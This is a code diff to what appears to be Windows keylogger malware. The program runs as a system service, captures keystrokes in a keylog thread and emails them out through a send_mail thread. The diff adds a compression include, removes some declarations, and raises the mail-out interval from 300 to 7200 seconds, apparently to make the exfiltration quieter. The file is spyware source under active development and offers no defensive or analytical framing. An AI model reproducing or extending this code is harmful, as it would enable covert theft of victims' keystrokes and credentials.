@@ -8,6 +8,7 @@
 #include "tlhelp32.h"
 #include "Logger.h"
 #include "SecurityTool.h"
+#include "CompressTool.h"
 
 #include  <io.h>
 #include  <stdio.h>
@@ -23,8 +24,6 @@ void decrypt_main(char*);
 void WINAPI service_proc(DWORD dwArgc, LPTSTR *lpszArgv);
 void WINAPI service_handler(DWORD fdwControl);
 
-BOOL RunProcess(LPSTR cmd);
-
 bool start_keylog_proc();
 bool stop_keylog_proc();
 void start_service_busi();
@@ -32,7 +31,7 @@ void stop_service_busi();
 DWORD WINAPI keylog_thread(LPVOID info);
 DWORD WINAPI email_thread(LPVOID info);
 bool send_mail();
-bool is_service_env();
+
 HANDLE keylog_tid;
 HANDLE email_tid;
 bool running = false;
@@ -259,7 +258,7 @@ DWORD WINAPI email_thread(LPVOID info){
 		time_t now = time(NULL);
 		double diff = difftime(now, last_send);
 		Logger::debug("Email Thread Running, Timediff %f", diff);
-		if(diff > 300){
+		if(diff > 7200){
 			bool ret = send_mail();
 			if(ret){
 				last_send = now;
